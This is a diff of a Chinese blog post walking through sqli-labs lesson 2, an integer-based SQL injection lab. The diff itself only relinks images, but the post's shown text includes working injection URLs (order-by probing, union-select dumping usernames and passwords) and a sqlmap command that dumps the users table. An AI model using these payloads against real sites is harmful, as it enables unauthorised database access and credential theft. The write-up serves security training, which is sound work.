@@ -1,14 +1,14 @@
 ---
 title: sqli-labs lession 2 (基于错误的GET整型注入)
 date: 2018-09-18 20:23:34
-tags:
+tags: [sqli-labs]
 categories: sql注入
 ---
 # sqli-labs lession 2 (基于错误的GET整型注入) #
 ---
 ## 登录界面 ##
 
-![1](https://i.imgur.com/v296GqN.png)
+![1](/img/sql/lesson2/1.png)
 
 ## 手注 ##
 
@@ -18,7 +18,7 @@ categories: sql注入
 
 `http://10.60.250.214/Less-2/?id=1%20and%201=2`
 
-![2](https://i.imgur.com/7Wu3A1n.png)
+![2](/img/sql/lesson2/2.png)
 
 果然存在注入点！！
 
@@ -26,23 +26,23 @@ categories: sql注入
 
 这里只是$id的获取方式变化了,查看源码就可以发现SQL变成如下形式了,其他都一样。
 
-![3](https://i.imgur.com/4rn5qJu.png)
+![3](/img/sql/lesson2/3.png)
 
 可以构造如下:
 
 `http://10.60.250.214/Less-2/?id=1%20order%20by%204%23`
 
-![4](https://i.imgur.com/28GQGdw.png)
+![4](/img/sql/lesson2/4.png)
 
 `http://10.60.250.214/Less-2/?id=1%20order%20by%203%23`
 
-![5](https://i.imgur.com/GFedqQC.png)
+![5](/img/sql/lesson2/5.png)
 
 这里可以判断出字段数目
 
 `http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,3%23`
 
-![6](https://i.imgur.com/KmkyV4Q.png)
+![6](/img/sql/lesson2/6.png)
 
 这些步骤和Lesson-1一致,可以查看这里。
 
@@ -52,7 +52,7 @@ categories: sql注入
 
 `http://10.60.250.214/Less-2/?id=-1%20union%20select%201,2,group_concat(username,%27:%27,password)%20from%20users%23`
 
-![7](https://i.imgur.com/VxALBtm.png)
+![7](/img/sql/lesson2/7.png)
 
 ## SQLMAP ##
 
@@ -64,6 +64,6 @@ categories: sql注入
 
 `sqlmap -u "http://10.60.250.214/Less-2/?id=1" --batch -D security -T users --columns --dump`
 
-![8](https://i.imgur.com/w0b4f8G.png)
+![8](/img/sql/lesson2/8.png)
 
-![9](https://i.imgur.com/15hkWOv.png)
+![9](/img/sql/lesson2/9.png)
